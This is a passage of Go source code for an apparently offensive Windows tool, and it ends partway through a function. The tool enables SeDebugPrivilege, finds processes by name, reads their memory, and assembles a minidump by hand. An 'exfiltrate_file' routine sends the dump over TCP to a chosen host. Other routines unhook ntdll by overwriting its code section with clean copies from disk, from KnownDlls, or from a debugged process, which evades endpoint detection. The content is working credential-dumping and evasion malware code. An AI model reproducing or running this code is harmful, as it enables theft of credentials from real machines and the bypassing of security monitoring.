package main


import (
	"os"
	"fmt"
	"net"
    "flag"
	"unsafe"
	"strings"
	"syscall"
	"strconv"
	"math/big"
	"crypto/rand"
	"unicode/utf8"
	"unicode/utf16"
	"encoding/binary"
	"golang.org/x/sys/windows"
)


const (
	MAXIMUM_ALLOWED uintptr = 0x02000000
	PROCESS_QUERY_INFORMATION uintptr = 0x0400
	PROCESS_VM_READ uintptr = 0x0010
	SE_PRIVILEGE_ENABLED = 0x00000002
	TOKEN_ADJUST_PRIVILEGES = 0x0020
	TOKEN_QUERY = 0x0008
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
	ProcessBasicInformation uintptr = 0x00
	ProcessQueryInformation uintptr = 0x0400
	ProcessVmRead uintptr = 0x0010
	PAGE_NOACCESS uint32 = 0x01
	MEM_COMMIT uint32 = 0x00001000
	ldr_offset uintptr = 0x18
	inInitializationOrderModuleList_offset uintptr = 0x30
	flink_dllbase_offset uintptr = 0x20
	flink_buffer_offset uintptr = 0x50
	flink_buffer_fulldllname_offset uintptr = 0x40
	letters = "abcdefghijklmnopqrstuvwxyz"
	PAGE_EXECUTE_WRITECOPY uintptr = 0x80
    SEC_IMAGE_NO_EXECUTE uintptr = 0x11000000
    offset_mappeddll uintptr = 0x1000
    SECTION_MAP_READ uintptr = 0x04
    DEBUG_PROCESS uint32 = 0x01
)

var (
	rtlGetVersion *windows.LazyProc
	ntGetNextProcess *windows.LazyProc
	ntOpenProcess *windows.LazyProc
	ntQueryInformationProcess *windows.LazyProc
	ntReadVirtualMemory *windows.LazyProc
	ntQueryVirtualMemory *windows.LazyProc
	ntOpenProcessToken *windows.LazyProc
	ntAdjustPrivilegesToken *windows.LazyProc
	ntClose *windows.LazyProc
	ntOpenSection *windows.LazyProc
	getProcessImageFileName *windows.LazyProc
	VirtualProtect *windows.LazyProc
    createFile *windows.LazyProc
    createFileMapping *windows.LazyProc
    mapViewOfFile *windows.LazyProc
    DebugActiveProcessStop *windows.LazyProc
    TerminateProcess *windows.LazyProc
    CreateProcess *windows.LazyProc
)


// Structures
type RTL_OSVERSIONINFOW struct {
	DwOSVersionInfoSize uint32
	DwMajorVersion      uint32
	DwMinorVersion      uint32
	DwBuildNumber       uint32
	DwPlatformId        uint32
	SzCSDVersion        [128]uint16
}

type OBJECT_ATTRIBUTES struct {
    Length                   uint32
    RootDirectory            windows.Handle
    ObjectName               *UNICODE_STRING
    Attributes               uint32
    SecurityDescriptor       uintptr
    SecurityQualityOfService uintptr
}

type CLIENT_ID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type PROCESS_BASIC_INFORMATION struct {
	ExitStatus                   uint32
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type MEMORY_BASIC_INFORMATION struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}


// Custom structures
type OSInformation struct {
	Field0	string `json:"field0"`
	Field1	string    `json:"field1"`
	Field2  string `json:"field2"`
}

type ModuleInformation struct {
	Field0	string `json:"field0"`
	Field1	string    `json:"field1"`
	Field2  string `json:"field2"`
	Field3  uint32 `json:"field3"`
}

type Mem64Information struct {
	Field0	uint64 `json:"field0"`
	Field1	uint32    `json:"field1"`
}

type UNICODE_STRING struct {
    Length        uint16
    MaximumLength uint16
    Buffer        *uint16
}

type STARTUPINFO struct {
    cb            uint32
    lpReserved    *uint16
    lpDesktop     *uint16
    lpTitle       *uint16
    dwX           uint32
    dwY           uint32
    dwXSize       uint32
    dwYSize       uint32
    dwXCountChars uint32
    dwYCountChars uint32
    dwFillAttribute uint32
    dwFlags         uint32
    wShowWindow     uint16
    cbReserved2     uint16
    lpReserved2     *byte
    hStdInput       windows.Handle
    hStdOutput      windows.Handle
    hStdError       windows.Handle
}

type PROCESS_INFORMATION struct {
    hProcess    windows.Handle
    hThread     windows.Handle
    dwProcessId uint32
    dwThreadId  uint32
}


func init() {
	// ntdll
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	rtlGetVersion = ntdll.NewProc("RtlGetVersion")
	ntGetNextProcess = ntdll.NewProc("NtGetNextProcess")
	ntQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	ntOpenProcess = ntdll.NewProc("NtOpenProcess")
	ntReadVirtualMemory = ntdll.NewProc("NtReadVirtualMemory")
	ntQueryVirtualMemory = ntdll.NewProc("NtQueryVirtualMemory")
	ntOpenProcessToken = ntdll.NewProc("NtOpenProcessToken")
	ntAdjustPrivilegesToken = ntdll.NewProc("NtAdjustPrivilegesToken")
	ntClose = ntdll.NewProc("NtClose")
	ntOpenSection = ntdll.NewProc("NtOpenSection")
	// psapi - Can I do this with ntdll?? :(
	psapi := windows.NewLazySystemDLL("psapi.dll")
	getProcessImageFileName = psapi.NewProc("GetProcessImageFileNameA")
	// kernel32
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualProtect = kernel32.NewProc("VirtualProtect")
    createFile = kernel32.NewProc("CreateFileA")
    createFileMapping = kernel32.NewProc("CreateFileMappingA")
    mapViewOfFile = kernel32.NewProc("MapViewOfFile")
    DebugActiveProcessStop = kernel32.NewProc("DebugActiveProcessStop")
    TerminateProcess = kernel32.NewProc("TerminateProcess")
    CreateProcess = kernel32.NewProc("CreateProcessW")
 

   
}


func read_remoteintptr(process_handle uintptr, base_address uintptr, size uintptr) uintptr {
	buffer := make([]byte, size)
	var bytesRead uintptr
	status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
	if status != 0 {
		fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
		return 0
	}
	read_value := *(*uintptr)(unsafe.Pointer(&buffer[0]))
	return read_value
}


func utf16BytesToUTF8(utf16Bytes []byte) []byte {
	u16s := make([]uint16, len(utf16Bytes)/2)
	for i := range u16s {
		u16s[i] = uint16(utf16Bytes[i*2]) | uint16(utf16Bytes[i*2+1])<<8
	}
	return []byte(string(utf16.Decode(u16s)))
}


func read_remoteWStr(process_handle uintptr, base_address uintptr, size uintptr) string {
	buffer := make([]byte, size)
	var bytesRead uintptr
	status, _, _ := ntReadVirtualMemory.Call(process_handle, base_address, uintptr(unsafe.Pointer(&buffer[0])), size, uintptr(unsafe.Pointer(&bytesRead)))
	if status != 0 {
		fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
		return ""
	}
	for i := 0; i < int(bytesRead)-1; i += 1 {
		if buffer[i] == 0x00 && buffer[i+1] == 0x00 {
			return string(utf16BytesToUTF8(buffer[:i+2]))
		}
	}
	return ""
}


func Reverse(s string) string {
	size := len(s)
	buf := make([]byte, size)
	for start := 0; start < size; {
		r, n := utf8.DecodeRuneInString(s[start:])
		start += n
		utf8.EncodeRune(buf[size-start:], r)
	}
	return string(buf)
}


func GetProcessByName(process_name string) []uintptr{
	var proc_handles_slice []uintptr;
	var s uintptr = 0;
	for {
		res, _, _ := ntGetNextProcess.Call(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s)))

		if (res != 0) {
			break
		}

		buf := [256]byte{}
		var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
		res, _, _ = getProcessImageFileName.Call(s, mem_address, 256);

		if (res > 1){
			var res_string string = string(buf[0:res]);
			var reverted_string string = Reverse(res_string);
			var index int = strings.Index(reverted_string, "\\");
			var result_name string = Reverse(reverted_string[0:index]);
			if (result_name == process_name){
				proc_handles_slice = append(proc_handles_slice, s);
			}
		}
	}
	return proc_handles_slice;
}


func enable_SeDebugPrivilege() bool {
	pid := uintptr(syscall.Getpid())
	hProcess := open_process(pid)

	// NtOpenProcessToken
	var tokenHandle syscall.Token
	ntstatus, _, _ := ntOpenProcessToken.Call(uintptr(hProcess), uintptr(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), uintptr(unsafe.Pointer(&tokenHandle)))
	if ntstatus != 0 {
		fmt.Printf("ntOpenProcessToken status: 0x%x\n", ntstatus)
		return false
	}
	luid := LUID{ LowPart:  20, HighPart: 0,}
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{ { Luid: luid, Attributes: 0x00000002, }, },
	}

	// NtAdjustPrivilegesToken
	ntstatus, _, _ = ntAdjustPrivilegesToken.Call(uintptr(tokenHandle), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if ntstatus != 0 {
		fmt.Printf("NtAdjustPrivilegesToken status: 0x%x\n", ntstatus)
		return false
	}

	// NtClose
	ntstatus, _, _ = ntClose.Call(uintptr(tokenHandle))
	if ntstatus != 0 {
		fmt.Printf("NtClose status: 0x%x\n", ntstatus)
		return false
	}

	return true
}


func open_process(pid uintptr) uintptr {
	var handle uintptr
	objectAttributes := OBJECT_ATTRIBUTES{}
	clientId := CLIENT_ID{UniqueProcess: pid}

	status, _, _ := ntOpenProcess.Call(uintptr(unsafe.Pointer(&handle)), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, uintptr(unsafe.Pointer(&objectAttributes)), uintptr(unsafe.Pointer(&clientId)))
	if (status != 0) {
		fmt.Printf("Failed to open process. NTSTATUS: 0x%X\n", status)
		return 0
	}
	return handle
}


func query_process_information(proc_handle uintptr) ([]ModuleInformation){
	var dll_base uintptr = 1337
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32

	// NtQueryInformationProcess
	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
	if status != 0 {
		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
		return nil
	}
	peb_addr := pbi.PebBaseAddress 
	// fmt.Printf("[+] PebBaseAddress:\t0x%s\n", fmt.Sprintf("%x", peb_addr))

	ldr_pointer := peb_addr + ldr_offset
	// fmt.Printf("[+] Ldr Pointer:\t0x%s\n", fmt.Sprintf("%x", ldr_pointer))

	ldr_addr := read_remoteintptr(proc_handle, ldr_pointer, 8)
	// fmt.Printf("[+] Ldr Address:\t0x%s\n", fmt.Sprintf("%x", ldr_addr))

	inInitializationOrderModuleList := ldr_addr + inInitializationOrderModuleList_offset
	next_flink := read_remoteintptr(proc_handle, inInitializationOrderModuleList, 8)
	// fmt.Printf("[+] next_flink: \t0x%s\n", fmt.Sprintf("%x", next_flink))

	moduleinfo_arr := []ModuleInformation{}
	
	for (dll_base != 0){
		next_flink = next_flink - 0x10
		dll_base = read_remoteintptr(proc_handle, (next_flink + flink_dllbase_offset), 8)
		if (dll_base == 0){
			break
		}

		buffer := read_remoteintptr(proc_handle, (next_flink + flink_buffer_offset), 8)
		base_dll_name := read_remoteWStr(proc_handle, buffer, 256)
		
		buffer = read_remoteintptr(proc_handle, (next_flink + flink_buffer_fulldllname_offset), 8)
		full_dll_path := read_remoteWStr(proc_handle, buffer, 256)
		
		module_info := ModuleInformation{ Field0: base_dll_name, Field1: full_dll_path, Field2: (fmt.Sprintf("%x", dll_base)), Field3: 0}
		moduleinfo_arr = append(moduleinfo_arr, module_info)
		next_flink = read_remoteintptr(proc_handle, (next_flink + 0x10), 8)
	}	

	return moduleinfo_arr

}


func find_object(moduleinfo_arr []ModuleInformation, aux_name string) (ModuleInformation){
	var results []ModuleInformation
	for i := 0; i < len(moduleinfo_arr); i++ {
		if moduleinfo_arr[i].Field0 == aux_name {
			results = append(results, moduleinfo_arr[i])	
		}
	}
	if (len(results) > 0) {
		return results[0]
	} else {
		module_info := ModuleInformation{ Field0: "", Field1: "", Field2: "", Field3: 0}
		return module_info
	}
}


func update_module_slice(moduleinfo_arr []ModuleInformation, aux_name string, aux_size int) ([]ModuleInformation){
	for i := 0; i < len(moduleinfo_arr); i++ {
		if moduleinfo_arr[i].Field0 == aux_name {
			moduleinfo_arr[i].Field3 = uint32(aux_size)
		}
	}
	return moduleinfo_arr
}


func get_pid(proc_handle uintptr) uintptr {
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	status, _, _ := ntQueryInformationProcess.Call(uintptr(proc_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
	if status != 0 {
		fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
		return 0
	}
	pid := pbi.UniqueProcessID
	return pid
}


func writeToFile(file_name string, byteArray []byte) () {
	// Write to binary file
	file, err := os.OpenFile(file_name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Printf("Error opening file: %v\n", err)
		return
	}
	defer file.Close()
	_, err = file.Write(byteArray)
	if err != nil {
		fmt.Printf("Error writing to file: %v\n", err)
		return
	}
}


func exfiltrate_file(dump_file []byte, ipAddrStr string, portAddrStr string) () {
	address := net.JoinHostPort(ipAddrStr, portAddrStr)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}
	defer conn.Close()
	_, err = conn.Write(dump_file)
	if err != nil {
		fmt.Println("Error sending data:", err)
		return
	}
}


func randomString(length int) (string) {
    result := make([]byte, length)
    for i := range result {
        num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
        if err != nil {
            return ""
        }
        result[i] = letters[num.Int64()]
    }
    return string(result)
}


func get_dump_bytearr(osInfo []OSInformation, moduleinfo_arr []ModuleInformation, mem64list_arr []Mem64Information, memoryRegions_byte_arr []byte) ([]byte) {
	// Calculate values
	number_modules := len(moduleinfo_arr)
	modulelist_size := 4
	modulelist_size += 108*(number_modules)
	for i := 0; i < len(moduleinfo_arr); i++ {
		module_fullpath_len := len(moduleinfo_arr[i].Field1)
		modulelist_size += (module_fullpath_len*2 + 8)
	}
	mem64list_offset := modulelist_size + 0x7c
	mem64list_size := (16 + 16*len(mem64list_arr))
	offset_memory_regions := mem64list_offset + mem64list_size
	fmt.Printf("[+] Total number of modules: \t%v\n", number_modules)
	fmt.Printf("[+] ModuleListStream size:   \t%v\n", modulelist_size)
	fmt.Printf("[+] Mem64List offset: \t\t%v\n", mem64list_offset)
	fmt.Printf("[+] Mem64List size: \t\t%v\n", mem64list_size)

	// Header
	var header []byte
	header = append(header, 0x4d, 0x44, 0x4d, 0x50) // Signature
	header = append(header, 0x93, 0xa7) // Version
	header = append(header, 0x00, 0x00) // ImplementationVersion
	header = append(header, 0x03, 0x00, 0x00, 0x00) // NumberOfStreams
	header = append(header, 0x20, 0x00, 0x00, 0x00) // StreamDirectoryRva
	for len(header) < 32 { header = append(header, 0x00) } // Other fields

	// Stream Directory
	modulelist_sizeByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(modulelist_sizeByteSlice, uint32(modulelist_size))
	mem64list_sizeByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(mem64list_sizeByteSlice, uint32(mem64list_size))
	mem64list_offsetByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(mem64list_offsetByteSlice, uint32(mem64list_offset))
	var stream_directory []byte
	stream_directory = append(stream_directory, 0x04, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, modulelist_sizeByteSlice...)
	stream_directory = append(stream_directory, 0x7c, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x07, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x38, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x44, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, 0x09, 0x00, 0x00, 0x00)
	stream_directory = append(stream_directory, mem64list_sizeByteSlice...)
	stream_directory = append(stream_directory, mem64list_offsetByteSlice...)
	
	// SystemInfoStream
	processor_architecture := 9
	majorVersion := osInfo[0].Field0
	minorVersion := osInfo[0].Field1
	buildNumber := osInfo[0].Field2
	processor_architectureByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(processor_architectureByteSlice, uint32(processor_architecture))
	majorVersionByteSlice := make([]byte, 4)
	aux_uint, _ := strconv.ParseUint(majorVersion, 10, 32)
	binary.LittleEndian.PutUint32(majorVersionByteSlice, uint32(aux_uint))
	minorVersionByteSlice := make([]byte, 4)
	aux_uint, _ = strconv.ParseUint(minorVersion, 10, 32)
	binary.LittleEndian.PutUint32(minorVersionByteSlice, uint32(aux_uint))
	buildNumberByteSlice := make([]byte, 4)
	aux_uint, _ = strconv.ParseUint(buildNumber, 10, 32)
	binary.LittleEndian.PutUint32(buildNumberByteSlice, uint32(aux_uint))
	var systeminfostream []byte
	systeminfostream = append(systeminfostream, processor_architectureByteSlice...)
	systeminfostream = append(systeminfostream, 0x00, 0x00, 0x00, 0x00)
	systeminfostream = append(systeminfostream, majorVersionByteSlice...)
	systeminfostream = append(systeminfostream, minorVersionByteSlice...)
	systeminfostream = append(systeminfostream, buildNumberByteSlice...)
	for len(systeminfostream) < 56 { systeminfostream = append(systeminfostream, 0x00) }

	// ModuleListStream
	var modulelist_stream []byte
	number_modules_ByteSlice := make([]byte, 4)
	binary.LittleEndian.PutUint32(number_modules_ByteSlice, uint32(number_modules))
	modulelist_stream = append(modulelist_stream, number_modules_ByteSlice...)
	pointer_index := 0x7c
	pointer_index += 4 // len(number_modulesByteSlice)
	pointer_index += (108*(number_modules))
	for i := 0; i < len(moduleinfo_arr); i++ {
		// Base Address
		field2_ByteSlice := make([]byte, 8)
		aux_field2, _ := strconv.ParseInt(moduleinfo_arr[i].Field2, 16, 64)
		binary.LittleEndian.PutUint64(field2_ByteSlice, uint64(aux_field2))
		// Size
		field3_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint32(field3_ByteSlice, uint32(moduleinfo_arr[i].Field3))
		// Index to module full path in unicode format
		pointer_index_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint32(pointer_index_ByteSlice, uint32(pointer_index))
		// Append
		modulelist_stream = append(modulelist_stream, field2_ByteSlice...)
		modulelist_stream = append(modulelist_stream, field3_ByteSlice...)
		modulelist_stream = append(modulelist_stream, 0x00, 0x00, 0x00, 0x00)
		modulelist_stream = append(modulelist_stream, pointer_index_ByteSlice...)
		pointer_index += (len(moduleinfo_arr[i].Field1)*2 + 8)		
		// Irrelevant fields to 0
		for i := 0; i < 80; i++ { modulelist_stream = append(modulelist_stream, 0x00) }
	}
	for i := 0; i < len(moduleinfo_arr); i++ {
		full_path := moduleinfo_arr[i].Field1
		full_path_length := len(full_path)
		// Full path length
		full_path_length_ByteSlice := make([]byte, 4)
		binary.LittleEndian.PutUint32(full_path_length_ByteSlice, uint32(full_path_length*2))
		// Full path to Unicode byte array
		full_path_utf16Encoded := utf16.Encode([]rune(full_path))
		unicode_bytearr := make([]byte, len(full_path_utf16Encoded)*2)
		for i, v := range full_path_utf16Encoded {
			binary.LittleEndian.PutUint16(unicode_bytearr[i*2:], v)
		}
		// Append
		modulelist_stream = append(modulelist_stream,full_path_length_ByteSlice...)
		modulelist_stream = append(modulelist_stream,unicode_bytearr...)
		modulelist_stream = append(modulelist_stream, 0x00, 0x00, 0x00, 0x00)
	}

	// Memory64List
	var memory64list_stream []byte
	// NumberOfEntries
	numberOfEntries_ByteSlice := make([]byte, 8)
	binary.LittleEndian.PutUint32(numberOfEntries_ByteSlice, uint32(len(mem64list_arr)))
	// Offset to memory regions
	offsetToMemoryRegions_ByteSlice := make([]byte, 8)
	binary.LittleEndian.PutUint32(offsetToMemoryRegions_ByteSlice, uint32(offset_memory_regions))
	// Append
	memory64list_stream = append(memory64list_stream, numberOfEntries_ByteSlice...)
	memory64list_stream = append(memory64list_stream, offsetToMemoryRegions_ByteSlice...)

	for i := 0; i < len(mem64list_arr); i++ {
		// Address
		mem64address := mem64list_arr[i].Field0
		// aux_mem64address, _ := strconv.ParseInt(mem64address, 16, 64)
		mem64Address_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint64(mem64Address_ByteSlice, uint64(mem64address))
		// Size
		mem64size := mem64list_arr[i].Field1
		mem64size_ByteSlice := make([]byte, 8)
		binary.LittleEndian.PutUint64(mem64size_ByteSlice, uint64(mem64size))
		// Append
		memory64list_stream = append(memory64list_stream, mem64Address_ByteSlice...)
		memory64list_stream = append(memory64list_stream, mem64size_ByteSlice...)
	}

    // Concatenate each part byte array
    var dump_file_bytes []byte
    dump_file_bytes = append(dump_file_bytes, header...)
    dump_file_bytes = append(dump_file_bytes, stream_directory...)
    dump_file_bytes = append(dump_file_bytes, systeminfostream...)
    dump_file_bytes = append(dump_file_bytes, modulelist_stream...)
    dump_file_bytes = append(dump_file_bytes, memory64list_stream...)
    dump_file_bytes = append(dump_file_bytes, memoryRegions_byte_arr...)    
	return dump_file_bytes
}


func get_local_lib_address(dll_name string) uintptr {
    // GetCurrentProcess
    proc_handle, _ := windows.GetCurrentProcess()
    process_handle := uintptr(proc_handle)
    // fmt.Printf("[+] Process Handle: \t%d\n", process_handle)
    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uint32

    // NtQueryInformationProcess
    status, _, _ := ntQueryInformationProcess.Call(uintptr(process_handle), ProcessBasicInformation, uintptr(unsafe.Pointer(&pbi)), uintptr(uint32(unsafe.Sizeof(pbi))), uintptr(unsafe.Pointer(&returnLength)),)
    if status != 0 {
        fmt.Printf("NtQueryInformationProcess failed with status: 0x%x\n", status)
        return 0
    }
    fmt.Printf("[+] Process ID: \t\t%d\n", pbi.UniqueProcessID)
    fmt.Printf("[+] PEB Base Address:\t\t0x%x\n", pbi.PebBaseAddress)

    // Ldr Address
    peb_baseaddress := pbi.PebBaseAddress
    ldr_pointer := peb_baseaddress + ldr_offset
    ldr_address := read_remoteintptr(process_handle, ldr_pointer, 8)
    fmt.Printf("[+] Ldr pointer: \t\t0x%x\n", ldr_pointer)
    fmt.Printf("[+] Ldr Address: \t\t0x%x\n", ldr_address)
    
    // next_flink
    InInitializationOrderModuleList:= ldr_address + inInitializationOrderModuleList_offset
    next_flink := read_remoteintptr(process_handle, InInitializationOrderModuleList, 8)
    // fmt.Printf("[+] Next flink: \t0x%x\n", next_flink)

    // Loop modules
    var dll_base uintptr = 1337
    for dll_base != 0 {
        next_flink = next_flink - 0x10
        dll_base = read_remoteintptr(process_handle, (next_flink + flink_dllbase_offset), 8)
        if (dll_base == 0){
            break    
        }
        buffer := read_remoteintptr(process_handle, (next_flink + flink_buffer_offset), 8)
        base_dll_name := read_remoteWStr(process_handle, buffer, 256)
        if (base_dll_name == dll_name){
            return dll_base
        }
        next_flink = read_remoteintptr(process_handle, (next_flink + 0x10), 8)
    }
    return 0
}


func get_section_info(base_address uintptr) (uintptr,uintptr) {
    process_handle, _ := windows.GetCurrentProcess()
    if (fmt.Sprintf("%d", process_handle) == ""){ return 0,0}
    proc_handle := uintptr(process_handle)
    var e_lfanew_addr uintptr = base_address + 0x3C
    var e_lfanew uintptr = read_remoteintptr(proc_handle, e_lfanew_addr, 4)
    var sizeofcode_addr uintptr = base_address + e_lfanew + 24 + 4
    var sizeofcode uintptr = read_remoteintptr(proc_handle, sizeofcode_addr, 4)
    var baseofcode_addr uintptr  = base_address + e_lfanew + 24 + 20
    var baseofcode uintptr = read_remoteintptr(proc_handle, baseofcode_addr, 4)
    return baseofcode, sizeofcode
}


func replace_ntdll_section(unhooked_ntdll_text uintptr, local_ntdll_txt uintptr, local_ntdll_txt_size uintptr){
    var oldProtect uintptr
    res, _, _ := VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, PAGE_EXECUTE_WRITECOPY, uintptr(unsafe.Pointer(&oldProtect)))
    if res != 1 {
        fmt.Println("Failed to change memory protection to PAGE_EXECUTE_WRITECOPY")
        return
    }
    /// fmt.Scanln()
    // Copy bytes to the address
    for i := uintptr(0); i < local_ntdll_txt_size; i++ {
        *(*byte)(unsafe.Pointer(local_ntdll_txt + i)) = *(*byte)(unsafe.Pointer(unhooked_ntdll_text + i))
    }
    /// fmt.Scanln()
    // Restore the original protection
    res, _, _ = VirtualProtect.Call(local_ntdll_txt, local_ntdll_txt_size, oldProtect, uintptr(unsafe.Pointer(&oldProtect)))
    if res != 1 {
        fmt.Println("Failed to restore the original memory protection")
        return
    }
}


func overwrite_disk(file_name string) uintptr {
    // CreateFileA
    fileNamePtr, _ := syscall.BytePtrFromString(file_name)
    file_handle, _, err := createFile.Call(uintptr(unsafe.Pointer(fileNamePtr)), windows.GENERIC_READ, windows.FILE_SHARE_READ, 0, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
    if windows.Handle(file_handle) == windows.InvalidHandle {
        fmt.Printf("Error creating file: %v\n", err)
        return 0
    }
    // fmt.Printf("[+] File handle: \t%d\n", file_handle)
    defer windows.CloseHandle(windows.Handle(file_handle))

    // CreateFileMappingA
    mapping_handle, _, err := createFileMapping.Call(file_handle, 0, (windows.PAGE_READONLY | SEC_IMAGE_NO_EXECUTE), 0, 0, 0)
    if mapping_handle == 0 {
        fmt.Printf("Error creating file mapping: %v\n", err)
        return 0
    }
    defer windows.CloseHandle(windows.Handle(mapping_handle))
    // fmt.Printf("[+] Mapping handle: \t%d\n", mapping_handle)

    // MapViewOfFile
    unhooked_ntdll, _, err := mapViewOfFile.Call(mapping_handle, windows.FILE_MAP_READ, 0, 0, 0)

    if unhooked_ntdll == 0 {
        fmt.Printf("Error mapping view of file: %v\n", err)
        return 0
    }
    // fmt.Printf("[+] Mapped Ntdll:\t0x%s\n", fmt.Sprintf("%x", unhooked_ntdll))

    // CloseHandle
    windows.CloseHandle(windows.Handle(file_handle))
    windows.CloseHandle(windows.Handle(mapping_handle))
    
    // Add Offset
    var unhooked_ntdll_text uintptr = unhooked_ntdll + offset_mappeddll
    return unhooked_ntdll_text
}


func overwrite_knowndlls() uintptr {
    // NtOpenSection
    var s string = "\\KnownDlls\\ntdll.dll"
    us := UNICODE_STRING{}
    us.Length = uint16(len(s) * 2)
    us.MaximumLength = us.Length + 2
    us.Buffer = windows.StringToUTF16Ptr(s)
    oa := OBJECT_ATTRIBUTES{
        Length:      uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
        RootDirectory: 0,
        ObjectName: &us,
        Attributes: 0,
    }
    var section_handle windows.Handle
    status, _, _ := ntOpenSection.Call(uintptr(unsafe.Pointer(&section_handle)), SECTION_MAP_READ, uintptr(unsafe.Pointer(&oa)))
    if status != 0 {
        fmt.Printf("[-] NtOpenSection failed\n")
        os.Exit(0)
        return 0
    }
    // fmt.Printf("[+] Section handle: \t0x%x\n", section_handle)

    // MapViewOfFile
    unhooked_ntdll, _, err := mapViewOfFile.Call(uintptr(section_handle), uintptr(SECTION_MAP_READ), 0, 0, 0)
    if unhooked_ntdll == 0 {
        fmt.Printf("[-] Error mapping view of file: %v\n", err)
        os.Exit(0)
        return 0
    }

    // CloseHandle
    windows.CloseHandle(windows.Handle(section_handle))
    
    // Add offset
    var unhooked_ntdll_text uintptr = unhooked_ntdll + offset_mappeddll
    return unhooked_ntdll_text
}


func overwrite_debugproc(file_path string, local_ntdll_txt uintptr, local_ntdll_txt_size uintptr) uintptr {
    // CreateProcess
    var si STARTUPINFO
    var pi PROCESS_INFORMATION
    si.cb = uint32(unsafe.Sizeof(si))
    applicationName := windows.StringToUTF16Ptr(file_path)

    success, _, err := CreateProcess.Call(uintptr(unsafe.Pointer(applicationName)), 0, 0, 0, 0, uintptr(DEBUG_PROCESS), 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))   
    if (success != 1) {
        fmt.Printf("CreateProcess failed: %v\n", err)
        os.Exit(0)
    }
    
    // NtReadVirtualMemory: debugged_process ntdll_handle = local ntdll_handle --> debugged_process .text section ntdll_handle = local .text section ntdll_handle
    buffer := make([]byte, local_ntdll_txt_size)
    var bytesRead uintptr
    status, _, _ := ntReadVirtualMemory.Call(uintptr(pi.hProcess), local_ntdll_txt, uintptr(unsafe.Pointer(&buffer[0])), local_ntdll_txt_size, uintptr(unsafe.Pointer(&bytesRead)))
    if status != 0 {
        fmt.Printf("NtReadVirtualMemory failed with status: 0x%x\n", status)
        os.Exit(0)
    }

    // TerminateProcess + DebugActiveProcessStop
    tp_bool, _, _ := TerminateProcess.Call(uintptr(pi.hProcess), 0)
    daps_bool, _, _ := DebugActiveProcessStop.Call(uintptr(pi.dwProcessId))
    if (tp_bool != 1){
        fmt.Printf("[-] TerminateProcess failed")
        os.Exit(0)
    }
    if (daps_bool != 1){
        fmt.Printf("[-] DebugActiveProcessStop failed")
        os.Exit(0)
    }

    return uintptr(unsafe.Pointer(&buffer[0]))
}


func overwrite(optionFlag string, pathFlag string){
	var local_ntdll uintptr = get_local_lib_address("ntdll.dll")
    // fmt.Printf("[+] Local Ntdll:\t0x%s\n", fmt.Sprintf("%x", local_ntdll))
    local_ntdll_txt_addr, local_ntdll_txt_size := get_section_info(local_ntdll)
    // fmt.Printf("[+] Local Ntdll Size:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_size))
    // fmt.Printf("[+] Local Ntdll Addr:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt_addr))
    var local_ntdll_txt uintptr = local_ntdll + local_ntdll_txt_addr
    // fmt.Printf("[+] Local Ntdll Text:\t0x%s\n", fmt.Sprintf("%x", local_ntdll_txt))
    var unhooked_ntdll_text uintptr = 0

